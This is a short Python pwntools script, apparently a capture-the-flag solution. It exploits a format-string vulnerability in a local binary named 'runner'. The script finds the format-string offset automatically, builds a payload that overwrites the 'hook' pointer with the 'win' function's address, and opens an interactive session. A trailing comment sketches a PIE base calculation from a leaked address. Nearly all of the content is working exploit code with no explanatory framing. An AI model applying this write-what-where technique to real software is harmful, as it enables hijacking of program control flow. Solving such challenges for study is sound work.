#!/usr/bin/env python3
from pwn import *

context.binary = './runner'
context.log_level = 'error'

def send_fmt(payload):
    p = process('./runner')
    p.recvuntil(b'payload:')
    p.sendline(payload)
    result = p.recvuntil(b'calling', timeout=1)
    p.close()
    return result

# Automatically find the offset
fmt = FmtStr(execute_fmt=send_fmt)
offset = fmt.offset
print(f"Found offset: {offset}")

# Now use it
p = process('./runner')
elf = context.binary

payload = fmtstr_payload(offset, {elf.symbols['hook']: elf.symbols["win"]})
p.recvuntil(b'payload:')
p.sendline(payload)
p.interactive()

''''

help -> 0x7f121314

pie_base = help - symbols[help]
win = pie_base + symbols[win]
'''